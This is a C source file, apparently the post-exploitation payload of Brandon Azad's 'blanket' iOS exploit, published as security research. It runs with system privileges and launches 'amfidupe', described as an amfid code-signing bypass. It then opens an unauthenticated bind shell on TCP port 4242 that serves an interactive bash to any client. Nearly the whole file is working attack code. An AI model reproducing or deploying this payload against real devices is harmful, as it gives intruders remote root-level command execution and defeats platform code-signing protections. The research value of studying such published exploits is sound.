/*
 * blanket_payload
 * Brandon Azad
 *
 * blanket_payload
 * ================================================================================================
 *
 *  This is the payload that gets run by the blanket app with system privileges. The first part of
 *  the payload parses arguments and spawns amfidupe, an amfid bypass that allows running
 *  pseudo-signed binaries with arbitrary entitlements with platform binary privileges. The second
 *  part of the payload sets up a bind shell. Finally, once the process receives a terminating
 *  signal, it stops running the shell, kills amfidupe, and exits.
 *
 */

#include <assert.h>
#include <dirent.h>
#include <errno.h>
#include <libgen.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <netinet/in.h>
#include <signal.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include "blanket/log/log.h"

// ---- The generic payload: Install a signal handler and start amfidupe --------------------------

// The directory containing all of our files.
char *working_directory;

// The PID of amfidupe. We will send amfidupe SIGHUP once we exit.
pid_t amfidupe_pid;

// Initialize our working directory.
static void
init_working_directory(const char *directory) {
	working_directory = realpath(directory, NULL);
	if (working_directory == NULL) {
		ERROR("Could not get realpath to directory \"%s\"", directory);
		exit(1);
	}
}

// Start the amfidupe daemon.
static bool
start_amfidupe() {
	// Get the path to the current binary.
	char self_path[PATH_MAX];
	uint32_t self_path_size = sizeof(self_path);
	int err = _NSGetExecutablePath(self_path, &self_path_size);
	assert(err == 0);
	// Use the path to the current binary to derive the path to amfidupe.
	char amfidupe_path[PATH_MAX];
	char *result = realpath(self_path, amfidupe_path);
	assert(result != NULL);
	dirname_r(amfidupe_path, amfidupe_path);
	strlcat(amfidupe_path, "/amfidupe", sizeof(amfidupe_path));
	assert(strlen(amfidupe_path) < PATH_MAX - 1);
	DEBUG_TRACE(1, "amfidupe = \"%s\"", amfidupe_path);
	// Make amfidupe executable.
	err = chmod(amfidupe_path, 0755);
	if (err != 0) {
		WARNING("Could not make amfidupe executable");
	}
	// Spawn amfidupe.
	char *const amfidupe_argv[] = { amfidupe_path, NULL };
	char *const amfidupe_envp[] = { NULL };
	err = posix_spawn(&amfidupe_pid, amfidupe_path, NULL, NULL,
			amfidupe_argv, amfidupe_envp);
	if (err != 0) {
		ERROR("Could not spawn amfidupe: error %d", err);
		return false;
	}
	INFO("Spawned amfidupe as PID %d", amfidupe_pid);
	return true;
}

// Stop running amfidupe.
static void
stop_amfidupe() {
	DEBUG_TRACE(1, "Killing amfidupe");
	int err = kill(amfidupe_pid, SIGHUP);
	if (err != 0) {
		WARNING("Could not kill amfidupe");
	}
}

// Prototype for the signal handler, which will depend on the payload.
static void signal_handler(int signum);

// Register our signal handler.
static void
install_signal_handler() {
	const int signals[] = {
		SIGHUP, SIGINT, SIGQUIT, SIGILL, SIGTRAP, SIGABRT, SIGEMT, SIGFPE, SIGBUS,
		SIGSEGV, SIGSYS, SIGPIPE, SIGALRM, SIGTERM, SIGXCPU, SIGXFSZ, SIGVTALRM, SIGPROF,
		SIGUSR1, SIGUSR2,
	};
	struct sigaction act = { .sa_handler = signal_handler };
	for (size_t i = 0; i < sizeof(signals) / sizeof(signals[0]); i++) {
		int err = sigaction(signals[i], &act, NULL);
		if (err != 0) {
			WARNING("Failed to register for signal %d", signals[i]);
		}
	}
}

// Parse the program arguments and perform the associated initialization.
static void
initialize(int argc, const char *argv[]) {
	if (argc != 2) {
		ERROR("Usage: blanket_payload <working-directory>");
		exit(1);
	}
	init_working_directory(argv[1]);
	install_signal_handler();
}

// ---- The specialized payload: Run a bind shell -------------------------------------------------

// Based on Ian Beer's mach_portal.

// The port on which the bind shell will be hosted.
static const int BIND_SHELL_PORT = 4242;

// The socket on which we are listening for a bind shell.
static int bind_shell_fd = -1;

// The signal handler for all signals. We could use SIG_IGN, but this helps for debugging.
static void
signal_handler(int signum) {
	DEBUG_TRACE(1, "Received signal %d", signum);
	close(bind_shell_fd);
	bind_shell_fd = -1;
}

// Append a directory or directory sequence (separated by ":") to the path variable.
static void
append_path(char **path, size_t *path_length, const char *directory) {
	size_t current_length = *path_length;
	size_t new_length = current_length + strlen(":") + strlen(directory);
	char *new_path = realloc(*path, new_length + 1);
	assert(new_path != NULL);
	sprintf(new_path + current_length, ":%s", directory);
	*path = new_path;
	*path_length = new_length;
}

// Prepare a "bin" directory from the payload.
static void
prepare_environment_bin(const char *base, const char *bin, char **path, size_t *path_length) {
	// Get the path to the directory.
	char bin_path[PATH_MAX];
	snprintf(bin_path, sizeof(bin_path), "%s/%s", base, bin);
	DIR *dir = opendir(bin_path);
	if (dir == NULL) {
		ERROR("Could not open \"%s\"", bin_path);
		return;
	}
	// Make all entries in the directory executable.
	for (;;) {
		struct dirent *ent = readdir(dir);
		if (ent == NULL) {
			break;
		}
		char entry_path[PATH_MAX];
		snprintf(entry_path, sizeof(entry_path), "%s/%s", bin_path, ent->d_name);
		int err = chmod(entry_path, 0755);
		if (err != 0) {
			WARNING("chmod(\"%s\"): %d", entry_path, err);
		}
	}
	// Add this directory to the path.
	append_path(path, path_length, bin_path);
	
}

// Prepare the environment. Return the path variable.
static char *
prepare_environment() {
	// Create the path variable.
	char *path = strdup("PATH=");
	size_t path_length = strlen("PATH=");
	// Prepare the bin directories in the payload. We do this first so that the payload
	// binaries override Apple's binaries in the shell.
	const char *bin_dirs[] = {
		"bin", "sbin", "usr/bin", "usr/sbin", "usr/local/bin",
	};
	for (size_t i = 0; i < sizeof(bin_dirs) / sizeof(bin_dirs[0]); i++) {
		prepare_environment_bin(working_directory, bin_dirs[i], &path, &path_length);
	}
	// Add the bin directories provided by Apple.
	append_path(&path, &path_length, "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec");
	DEBUG_TRACE(1, "%s", path);
	return path;
}

// Run a bind shell with the specified path environment variable.
static void
run_bind_shell(char *path_env) {
	// Construct the arguments to the shell.
	char shell_path[PATH_MAX];
	snprintf(shell_path, sizeof(shell_path), "%s%s", working_directory, "/bin/bash");
	char *shell_argv[] = { shell_path, "-i", NULL };
	char *shell_envp[] = { path_env, NULL };
	// Create a socket.
	bind_shell_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (bind_shell_fd < 0) {
		ERROR("Could not create socket");
		goto fail_0;
	}
	// Bind the socket.
	struct sockaddr_in sin = {};
	sin.sin_family = AF_INET;
	sin.sin_port = htons(BIND_SHELL_PORT);
	sin.sin_addr.s_addr = INADDR_ANY;
	int err = bind(bind_shell_fd, (struct sockaddr *)&sin, sizeof(sin));
	if (err != 0) {
		ERROR("Could not bind socket");
		goto fail_1;
	}
	// Listen for incoming connections.
	err = listen(bind_shell_fd, 1);
	if (err != 0) {
		ERROR("Could not listen on socket");
		goto fail_1;
	}
	INFO("Bind shell listening on port %d", BIND_SHELL_PORT);
	// Loop waiting for clients to connect.
	for (;;) {
		// Accept a connection from a client.
		int connfd = accept(bind_shell_fd, NULL, NULL);
		if (connfd < 0) {
			break;
		}
		// Create posix_spawn file actions to bind the shell's stdin, stdout, and stderr to
		// the client socket.
		posix_spawn_file_actions_t file_actions;
		posix_spawn_file_actions_init(&file_actions);
		posix_spawn_file_actions_adddup2(&file_actions, connfd, STDIN_FILENO);
		posix_spawn_file_actions_adddup2(&file_actions, connfd, STDOUT_FILENO);
		posix_spawn_file_actions_adddup2(&file_actions, connfd, STDERR_FILENO);
		// Spawn the shell.
		pid_t shell_pid;
		err = posix_spawn(&shell_pid, shell_path, &file_actions, NULL,
				shell_argv, shell_envp);
		posix_spawn_file_actions_destroy(&file_actions);
		if (err) {
			ERROR("Could not spawn shell: %d", err);
			continue;
		}
		DEBUG_TRACE(1, "Spawned shell with PID %d", shell_pid);
		// Wait for the shell to exit. In the meantime blanket might send us a signal to
		// exit, in which case we'll wait for the current shell to finish and then break at
		// the accept() call above. This lets a client keep running commands (which will be
		// validated by amfidupe).
		for (;;) {
			int status;
			pid_t pid = waitpid(shell_pid, &status, 0);
			if (pid != -1 || errno != EINTR) {
				break;
			}
		}
		DEBUG_TRACE(1, "Child %d exited", shell_pid);
	}
	DEBUG_TRACE(1, "Exiting bind shell server");
fail_1:
	close(bind_shell_fd);
	bind_shell_fd = -1;
fail_0:
	return;
}

// Run a bind shell.
static void
run_shell_server() {
	char *path_env = prepare_environment();
	run_bind_shell(path_env);
}

// ---- Main --------------------------------------------------------------------------------------

int
main(int argc, const char *argv[]) {
	INFO("blanket_payload: pid=%d, uid=%d", getpid(), getuid());
	// Parse the input arguments and initialize.
	initialize(argc, argv);
	// Launch amfidupe.
	start_amfidupe();
	// Run a shell server. Once a signal is delivered this routine will break out of the loop
	// and clean up after itself.
	run_shell_server();
	// We're done running the payload, so stop amfidupe.
	stop_amfidupe();
	// Done.
	INFO("blanket_payload: exit");
	return 0;
}
